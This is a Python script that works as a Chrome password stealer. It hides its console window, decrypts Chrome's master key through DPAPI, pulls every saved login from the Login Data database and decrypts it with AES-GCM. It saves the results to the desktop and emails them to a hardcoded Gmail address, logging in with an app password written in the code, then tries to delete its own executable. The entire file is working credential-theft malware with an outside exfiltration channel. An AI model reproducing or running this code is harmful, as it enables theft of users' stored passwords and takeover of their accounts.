import os, json, base64, sqlite3, shutil, smtplib, sys, subprocess, threading, time, traceback
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def hide_console():
    if sys.platform == "win32":
        import win32gui, win32con
        try:
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
        except: pass

def send_email(subject, body, to_email, from_email, app_password):
    try:
        msg = MIMEMultipart(); msg['From'] = from_email; msg['To'] = to_email; msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587); server.starttls()
        server.login(from_email, app_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {str(e)}")
        return False

def get_chrome_master_key():
    try:
        # Path to Chrome's "Local State" file
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        
        if not os.path.exists(local_state_path):
            return None, "Local State file not found"
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        # Get the encrypted key
        os_crypt = local_state.get("os_crypt", {})
        encrypted_key = os_crypt.get("encrypted_key", "")
        
        if not encrypted_key:
            return None, "No encrypted key found"
        
        # Remove the DPAPI prefix
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        
        # Decrypt the key using DPAPI
        try:
            import win32crypt
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key, "Success"
        except Exception as e:
            return None, f"DPAPI decryption failed: {str(e)}"
    except Exception as e:
        return None, f"Error getting master key: {str(e)}"

def find_chrome_profile():
    # Try multiple possible Chrome locations
    chrome_base = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    if not os.path.exists(chrome_base):
        return None, "Chrome User Data folder not found"
    
    # Check for Default profile first
    default_path = os.path.join(chrome_base, "Default", "Login Data")
    if os.path.exists(default_path):
        return default_path, "Default profile"
    
    # Look for other profiles
    for item in os.listdir(chrome_base):
        profile_path = os.path.join(chrome_base, item)
        if os.path.isdir(profile_path) and "Profile" in item:
            login_data = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data):
                return login_data, f"Profile {item}"
    
    return None, "No Chrome profiles with Login Data found"

def decrypt_chrome_password(encrypted_password, master_key):
    if master_key:
        # Try Chrome v10 decryption
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            # Remove the v10 prefix
            encrypted_password = base64.b64decode(encrypted_password)[3:]
            
            # Extract IV and ciphertext
            iv = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-256-GCM
            cipher = Cipher(
                algorithms.AES(master_key),
                modes.GCM(iv, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            return decrypted.decode('utf-8'), "Chrome v10"
        except Exception as e:
            return None, f"v10 decryption failed: {str(e)}"
    
    # Try DPAPI decryption
    try:
        import win32crypt
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        return decrypted_password.decode('utf-8'), "DPAPI"
    except Exception as e:
        return None, f"DPAPI decryption failed: {str(e)}"

def get_chrome_passwords():
    login_data_path, profile_msg = find_chrome_profile()
    if not login_data_path:
        return f"Chrome detection failed: {profile_msg}"
    
    # Get master key for v10 encryption
    master_key, key_msg = get_chrome_master_key()
    
    password_list = []
    copy_path = os.path.join(os.environ["TEMP"], "chrome_db_copy")
    shutil.copy2(login_data_path, copy_path)
    
    try:
        conn = sqlite3.connect(copy_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        rows = cursor.fetchall()
        if not rows:
            return f"No passwords found in Chrome ({profile_msg})"
        
        for row in rows:
            url, username, encrypted_password = row[0], row[1], row[2]
            
            try:
                decrypted_password, method = decrypt_chrome_password(encrypted_password, master_key)
                if decrypted_password:
                    password_list.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nDecryption: {method}\n\n")
                else:
                    # If decryption fails, output the full encrypted password in hex
                    encrypted_hex = encrypted_password.hex()
                    password_list.append(f"URL: {url}\nUsername: {username}\nPassword: [ENCRYPTED:{encrypted_hex}]\nDecryption: {method}\n\n")
            except Exception as e:
                password_list.append(f"URL: {url}\nUsername: {username}\nPassword: [Error: {str(e)}]\n\n")
        
        conn.close()
        os.remove(copy_path)
        return "\n".join(password_list)
    except Exception as e:
        return f"Error retrieving Chrome passwords: {str(e)}\n{traceback.format_exc()}"

def get_all_passwords():
    all_passwords = "=== BROWSER PASSWORD EXTRACTION ===\n\n"
    
    # Get Chrome passwords with detailed info
    all_passwords += f"Chrome Passwords:\n{get_chrome_passwords()}\n\n"
    
    return all_passwords

def run_silently():
    hide_console()
    all_passwords = get_all_passwords()
    
    # Save to file as backup
    try:
        desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
        output_path = os.path.join(desktop_path, "chrome_passwords.txt")
        with open(output_path, "w", encoding="utf-8") as output_file:
            output_file.write(all_passwords)
    except:
        pass
    
    # Send email
    success = send_email("Extracted Browser Passwords", all_passwords, 
                        "aybgslayer@gmail.com", "aybgslayer@gmail.com", 
                        "uxno ntpl kcmf gtyl")
    
    if success:
        try: os.remove(sys.executable)
        except: pass
    return success

if __name__ == "__main__":
    threading.Thread(target=run_silently, daemon=True).start()
    time.sleep(10)  # Give more time for completion